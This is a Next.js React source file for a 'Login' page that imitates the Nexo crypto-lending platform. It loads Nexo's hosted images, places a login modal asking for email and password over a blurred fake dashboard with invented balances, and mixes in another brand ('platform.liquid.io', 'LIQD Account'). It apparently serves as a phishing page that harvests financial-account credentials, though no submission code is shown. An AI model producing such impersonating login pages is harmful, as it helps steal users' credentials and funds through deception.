import Head from 'next/head'
import { Fragment, useEffect } from "react";
import Script from "next/script"
import Link from "next/link"




export default function login(props){

  useEffect( () => {
      console.log(props);

  },[])


    const html = <Fragment>
        <Head>
        
  <meta charSet="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no" />
  <link rel="manifest" href="/assets/meta/manifest.json" />
  <link rel="shortcut icon" href="/assets/meta/favicon.ico" />
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/meta/apple-icon-57x57.png" />
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/meta/apple-icon-60x60.png" />
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/meta/apple-icon-72x72.png" />
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/meta/apple-icon-76x76.png" />
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/meta/apple-icon-114x114.png" />
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/meta/apple-icon-120x120.png" />
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/meta/apple-icon-144x144.png" />
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/meta/apple-icon-152x152.png" />
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/meta/apple-icon-180x180.png" />
  <link rel="icon" type="image/png" sizes="192x192" href="/assets/meta/android-icon-192x192.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/meta/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/meta/favicon-96x96.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/meta/favicon-16x16.png" />
  
  <title>Login</title>
  </Head>
  <div id="nexo-platform" className="application" style={ {filter: 'blur(2px)', overflow: 'hidden'}}>
  <header id="Header">
    <section>
      <aside>
        <a className="m-t-5" href="/"><img alt="Nexo" width={98} src="/assets/images/logo.png" /></a>
      </aside>
      <nav />
      <aside>
        <a className="button" href="/register">New Account</a><a className="button" href="/">Login</a><a className="MenuHelp" aria-expanded="false"><i className="far fa-question-circle" /></a>
      </aside>
    </section>
  </header>
  <div>
  <main>
    <section className="fakeBackground">
      <div>
        <div className="NexoBenefits">
          <a className="close"><i className="fal fa-times" /></a>
          <h1>Flexible Instant Crypto Credit Lines</h1>
          <div>
            <div>
              <img alt height={32} src="https://static.nexo.io/currencies/BTC.svg" /><img alt height={32} src="https://static.nexo.io/currencies/ETH.svg" />
              <img alt height={32} src="https://static.nexo.io/currencies/NEXO.svg" /><img alt height={32} src="https://static.nexo.io/currencies/XRP.svg" style={{marginLeft: 4}} />
            </div>
            <h2>1. Deposit Crypto Assets to Your Insured &amp; Secured Nexo Account</h2>
            <h3>$375M insurance and maximum security with the audited custodian BitGo</h3>
          </div>
          <div>
            <div><img alt height={32} src="https://static.nexo.io/currencies/USD.png" /><img alt height={32} src="https://static.nexo.io/currencies/EUR.png" /></div>
            <h2>2. Credit Line is Now Available. Borrow with Automatic Approval, no Credit Checks</h2>
            <h3>Your Credit Line limit is based on the value of your deposited crypto assets</h3>
          </div>
          <div>
            <div><i className="fa fa-money-bill-alt" /></div>
            <h2>3. Spend Money Instantly with Nexo Card or Borrow Cash and Stablecoins</h2>
            <h3>Spend from the Credit Line at any time. From only 6.9% APR on what you use</h3>
          </div>
          <div>
            <div><i className="fa fa-undo" /></div>
            <h2>No Minimum Loan Repayments, No Hidden Fees</h2>
            <h3>Interest is debited automatically from your available credit limit. Flexible repayments, at any time</h3>
          </div>
        </div>
        <div className="banners">
          <a href="/exchange/swap">
            <div className="Banner lowestCryptCreditLineRates" style={{backgroundImage: 'url("https://static.nexo.io/banners/platform/lower-interest-bg.png")'}}>
              <img alt width="100%" src="https://static.nexo.io/banners/platform/lower-interest-text.png" />
            </div>
          </a>
          <a href="/exchange/buy">
            <div className="Banner earnUpTo10PercentsOnAssets" style={{backgroundImage: 'url("https://static.nexo.io/banners/platform/interest-bg.png")'}}>
              <img alt width="100%" src="https://static.nexo.io/banners/platform/earn-on-crypto-content.png" />
            </div>
          </a>
        </div>
        <div className="AccountFinancialOverview">
          <div>
            <i className="far fa-question-circle" />
            <h6>Portfolio Balance</h6>
            <div />
            <span>$2,048.00</span>
          </div>
          <div>
            <i className="far fa-question-circle" />
            <h6>Credit Line</h6>
            <span className="tc-indigo-500">$512.00</span>
            <div />
            <h6>Available Credit</h6>
            <span className="tc-blue-500">$1,024.00</span>
          </div>
          <div>
            <i className="far fa-question-circle" />
            <h6>Interest Earned</h6>
            <div />
            <span className="tc-mint-500">$128.00</span><a href="/interest-earned">See Interest Details <i className="far fa-long-arrow-right" /></a>
          </div>
          <div>
            <h6>Loyalty Level</h6>
            <div />
            <span>Platinum</span><a href="/profile/loyalty-levels">You’re Platinum Now! <i className="far fa-long-arrow-right" /></a>
          </div>
        </div>
        <div className="card">
          <div className="actions">
            <a className="ActionButton" href="/borrow"><img alt src="/assets/icons/borrow-dashboard.svg" /><strong>Borrow</strong><span>Cash or Stablecoins</span></a>
            <a className="ActionButton" href="/repayment"><img alt src="/assets/icons/repay-dashboard.svg" /><strong>Repay</strong><span>with Crypto, Cash or Stablecoins</span></a>
            <a className="ActionButton" href="/exchange"><img alt="Nexo Wallet" src="/assets/icons/exchange-dashboard.svg" /><strong>Exchange</strong><span>Buy, Sell and Swap</span></a>
          </div>
          <table className="AssetList" id="AssetList" cellSpacing={0} cellPadding={0} border={0}>
            <thead>
              <tr>
                <th align="left" width={200}><button type="button" className="Button secondary">Calculator</button></th>
                <th align="right" width={200}>Balance</th>
                <th align="right">Credit Line</th>
                <th align="right">Earn Interest</th>
                <th colSpan={3} align="right">
                  <div className="Toggle"><label>Hide Zero Balance Assets</label><span>off</span></div>
                </th>
              </tr>
            </thead>
            <tbody />
          </table>
        </div>
      </div>
    </section>
  </main>
  </div>
  </div>
  <div className="Portal backdrop">
    <div className="Modal FormLogin" style={{width: 500}}>
      <main>
        <h4>Login</h4>
        <form className="mt-l">
          <div className="center p-s bg-grey-50 radius-m">
            <span className="tc-grey-600 fw-n">Please make sure you are visiting </span>
            <div className="mt-xs2">
              <span className="tc-mint-500 fw-n"> <i className="fas fa-lock">&nbsp;</i>https://</span><span className="fw-n tc-grey-900">platform.liquid.io</span>
            </div>
          </div>
          <label className="mt-l">Email</label>
          <div className="TextBox"><input type="email" defaultValue /></div>
          <label className="mt-xl">Password</label>
          <div className="TextBox"><input type="password" defaultValue /></div>
          <div className="flex mt-xl"><button type="submit" className="Button large primary block">Login</button></div>
        </form>
        <div className="flex center fs-medium semi-bold links mt-l">
          <span className="light">Don't have a LIQD Account?</span><i className="m-h-5">•</i> <Link href="/app/register/"><a>New Account</a></Link><i className="m-h-5">•</i><a href="/recover-password">Forgot Password</a>
        </div>
        <div className="center mt-xl">
          <button type="button" className="Button link LanguagePickerButton" aria-expanded="false"><i className="far fa-language" /> Language</button>
        </div>
      </main>
    </div></div>




        
    <Script src="https://kit.fontawesome.com/d53d06f463.js" strategy='beforeInteractive' />

    </Fragment>


    return html;

}